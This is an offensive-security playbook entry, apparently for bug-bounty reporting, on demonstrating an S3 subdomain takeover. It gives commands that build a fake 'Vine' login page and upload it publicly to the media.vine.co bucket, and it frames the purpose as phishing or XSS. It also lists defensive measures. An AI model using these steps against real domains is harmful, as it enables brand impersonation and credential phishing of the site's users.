---
tags:
  - upload
  - poc
  - phishing
  - xss
type: procedure
tools:
  - '[[tools/AWS-CLI]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/aws-s3-cp-upload]]'
verified: false
platforms:
  - AWS
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
  - '[[JavaScript]]'
updated_at: '2025-12-14T04:38:49.131Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: c5b4e7ed-7cd0-4236-8a01-1919f86cb726
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
  - '[[JavaScript]]'
---
---

# Upload-POC-to-Demonstrate-Control

## Summary

This procedure uploads proof-of-concept content to the claimed S3 bucket, demonstrating full control over the subdomain for malicious purposes like phishing or XSS.

## Description

With bucket control, attackers can host arbitrary files accessible via the subdomain, enabling attacks such as fake login pages that could lead to credential theft, XSS exploitation on the parent domain, or malware distribution, causing brand damage.

## Requirements

1. Claimed S3 bucket
2. AWS CLI access
3. POC content file (e.g., HTML for phishing)

## Defense

Defensive measures and detection strategies:

- Enable S3 access logging and monitor uploads
- Use bucket policies to restrict public access
- Scan for subdomain takeovers with tools like Subjack

## Objectives

1. Prove subdomain hijack
2. Simulate impact (phishing, XSS)
3. Highlight severity for reporting

## Instructions

### Step 1: Prepare POC File

**Context**: Create a simple HTML file mimicking a login form.

```bash
echo '<!DOCTYPE html><html><body><h1>Fake Vine Login</h1><form action="/submit" method="post"><input type="text" placeholder="Username"><input type="password" placeholder="Password"><button>Login</button></form></body></html>' > fake-login.html
```

### Step 2: Upload to Bucket

**Context**: Copy the file to S3, making it publicly accessible.

**Command** ([[commands/aws-s3-cp-upload]]):
```bash
aws s3 cp fake-login.html s3://media.vine.co/login.html --acl public-read
```

> Output: "upload: fake-login.html to s3://media.vine.co/login.html". Access via http://media.vine.co/login.html.

### Step 3: Validate Access

**Context**: Browse to confirm control.

Manual: Visit the URL; page loads from attacker's content.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Drive-by Compromise]]
- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/aws-s3-cp-upload]]

## Tools Used

- [[tools/AWS-CLI]]

## Tags

- [[upload]]
- [[poc]]
- [[Phishing]]
- [[xss]]
